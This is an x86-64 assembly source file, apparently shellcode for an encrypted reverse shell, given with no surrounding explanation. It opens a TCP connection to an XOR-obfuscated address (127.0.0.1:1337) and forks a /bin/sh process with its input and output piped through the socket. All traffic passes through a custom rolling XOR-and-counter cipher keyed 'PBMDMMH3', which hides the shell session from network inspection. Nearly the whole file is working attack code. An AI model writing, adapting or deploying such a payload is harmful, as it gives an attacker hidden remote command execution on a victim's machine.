BITS 64

section .text
global _start

_start:

    ; make room on the stack (8 bytes) buffer
    sub rsp, 0x9
    mov r15, rsp        ; buffer for incoming traffic
    sub rsp, 0x9
    mov r14, rsp        ; buffer for outgoing traffic

    ;              SYS_SOCKET

    mov rax, 41                 ; sys_socket
    mov rdi, 2                  ; domain = 2 (AF_INET)
    mov rsi, 1                  ; Type = 1 (SOCK_STREAM)
    xor rdx, rdx                ; Protocol = 0 (TCP)
    syscall

    ; Save return value of syscall
    mov rdx, rax

    ;               SYS_CONNECT
    mov rbx, 0xfeffff80         ; xor of 0x0100007f and 0xffffffff
    mov rax, 0xffffffff
    xor rbx, rax                ; mov 0x0100007f in rbx
    push rbx                    ; s_addr = 127.0.0.1
    push word 0x3905            ; int port = 1337
    push word 0x2               ; int family = AF_INET

    mov rax, 42
    mov rdi, rdx                ; fd = return fd of sys_socket
    mov rsi, rsp                ; *uservaddr = rsp (addr of start of struct)
    mov rdx, 24                 ; addrlen = 24
    syscall

    mov r9, rdi                ; save fd of socket
    
    ;              SYS_PIPE
    xor rbx, rbx                
    push rbx                   ; push int of 0 (fd used for input)

    mov r13, rsp               ; save pipe addr to r13 register (input)

    mov rax, 22                ; sys_pipe
    mov rdi, rsp               ; rdi = addr of int
    syscall

    ;              SYS_PIPE

    push rbx             ; push int of 0 (fd used for output)

    mov r12, rsp               ; save pipe addr to r12 register (input)

    mov rax, 22                ; sys_pipe
    mov rdi, rsp               ; rdi = addr of int (both pipes)
    syscall


    call _recv_thread
    call _bash_thread
    call _send_command
;call _echo

_recv_thread:
    mov rbx, 1      ; set counter to 1

    mov rax, 57     ; SYS_FORK Op Code
    syscall

	test rax, rax  ; If the return value is 0, we are in the child process
	jz .readloop

    ret

    .readloop:

        ;           SYS_READ
        xor     rax, rax          ; SYS_READ rax = 0
        mov     rdi, r9           ; client socket fd
        mov     rsi, r15          ; buffer
        mov     rdx, 8            ; read 8 bytes 
        syscall

        mov rcx, rax               ; save number of bytes read

        ; decrypt buffer
        ; IV = PBMDMMH3
        xor byte [r15], 0x50      ; xor P to 1th byte
        sub byte [r15], bl        ; sub counter to 1th byte
        xor byte [r15 + 1], 0x42  ; xor B to 2th byte
        sub byte [r15 + 1], bl    ; sub counter to 2th byte
        xor byte [r15 + 2], 0x4d  ; xor M to 3th byte
        sub byte [r15 + 2], bl    ; sub counter to 3th byte
        xor byte [r15 + 3], 0x44  ; xor D to 4th byte
        sub byte [r15 + 3], bl    ; sub counter to 4th byte
        xor byte [r15 + 4], 0x4d  ; xor M to 5th byte
        sub byte [r15 + 4], bl    ; sub counter to 5th byte
        xor byte [r15 + 5], 0x4d  ; xor M to 6th byte
        sub byte [r15 + 5], bl    ; sub counter to 6th byte
        xor byte [r15 + 6], 0x48  ; xor H to 7th byte
        sub byte [r15 + 6], bl    ; sub counter to 7th byte
        xor byte [r15 + 7], 0x33  ; xor 3 to 8th byte
        sub byte [r15 + 7], bl    ; sub counter to 8th byte

        ;           SYS_WRITE
        xor     rdi, rdi
        mov     rax, 1            ; SYS_WRITE rax = 1
        mov     edi, [r13+2]      ; pipe write side
        ror     rdi, 16           ; roll right 16 bits
        mov     rsi, r15          ; buffer
        mov     rdx, rcx          ; number of bytes received in _read
        syscall

        mov rcx, rbx
        inc cx                    ; increment counter
        cmp cx, 130               ; if next counter increment is equal to 130
        je .donotinccounter       ; then jump to reset the counter to 1
            inc bl
            jmp .readloop
        .donotinccounter:
        mov rbx, 1                ; reset counter to 1
        jmp .readloop


_bash_thread:
    mov rax, 57 ; SYS_FORK Op Code
    syscall

	test rax, rax  ;If the return value is 0, we are in the child process
	jz .bash_exec

    ret

    .bash_exec:

    ; STDIN
    xor rdi, rdi
    mov rax, 33
    mov edi, [r13]              ; pipe read side (STDIN from socket)
    xor rsi, rsi                ; oldfd = 0 (STDIN)
    syscall
    ; STDOUT
    mov rax, 33
    mov edi, [r12+2]            ; pipe write side (STDOUT from bash)
    ror rdi, 16                 ; rol right 16 bits
    mov rsi, 1                  ; oldfd = 1 (STDOUT)
    syscall
    ; STDERR
    mov rax, 33
    mov rsi, 2                  ; oldfd = 2 (STDOUT)
    syscall
    
    ;;               EXECVE /bin/sh
    xor rbx, rbx
    xor rcx, rcx


    push rbx                    ; push 0x00
    mov rbx, 0x68732F6E69622F2F ; "//bin/sh"
    push rbx
    ; save "//bin/sh" addr
    mov rbx, rsp

    push rcx                    ; push 0x00

    push rbx                    ; push *char[] of "//bin/sh"

    ; execve of "//bin/sh"
    mov rax, 59                 ; execve syscall (x86_64)
    mov rdi, rbx                ; char* = "//bin/sh"
    mov rsi, rsp                ; *argv[] = "//bin/sh"
    xor rdx, rdx                ; *envp[] = 0
    syscall

_send_command:

    mov rbx, 1      ; set counter to 1

    .readloop:
        ;           SYS_READ
        xor     rax, rax          ; SYS_READ rax = 0
        xor     rdi, rdi
        mov     edi, [r12]        ; pipe read side (STDOUT from bash)
        mov     rsi, r14          ; buffer
        mov     rdx, 8            ; read 8 bytes 
        syscall

        mov rcx, rax              ; save bytes read

        ; decrypt buffer
        ; IV = PBMDMMH3
        add byte [r14], bl        ; sub counter to 1th byte
        xor byte [r14], 0x50      ; xor P to 1th byte
        add byte [r14 + 1], bl    ; sub counter to 2th byte
        xor byte [r14 + 1], 0x42  ; xor B to 2th byte
        add byte [r14 + 2], bl    ; sub counter to 3th byte
        xor byte [r14 + 2], 0x4d  ; xor M to 3th byte
        add byte [r14 + 3], bl    ; sub counter to 4th byte
        xor byte [r14 + 3], 0x44  ; xor D to 4th byte
        add byte [r14 + 4], bl    ; sub counter to 5th byte
        xor byte [r14 + 4], 0x4d  ; xor M to 5th byte
        add byte [r14 + 5], bl    ; sub counter to 6th byte
        xor byte [r14 + 5], 0x4d  ; xor M to 6th byte
        add byte [r14 + 6], bl    ; sub counter to 7th byte
        xor byte [r14 + 6], 0x48  ; xor H to 7th byte
        add byte [r14 + 7], bl    ; sub counter to 8th byte
        xor byte [r14 + 7], 0x33  ; xor 3 to 8th byte

        ;           SYS_WRITE
        mov     rax, 1            ; SYS_WRITE rax = 1
        mov     rdi, r9           ; socket
        mov     rsi, r14          ; buffer
        mov     rdx, rcx          ; number of bytes received in _read
        syscall

        mov rcx, rbx
        inc cx                    ; increment counter
        cmp cx, 130               ; if next counter increment is equal to 130
        je .donotinccounter       ; then jump to reset the counter to 1
            inc bl
            jmp .readloop
        .donotinccounter:
        mov rbx, 1                ; reset counter to 1
        jmp .readloop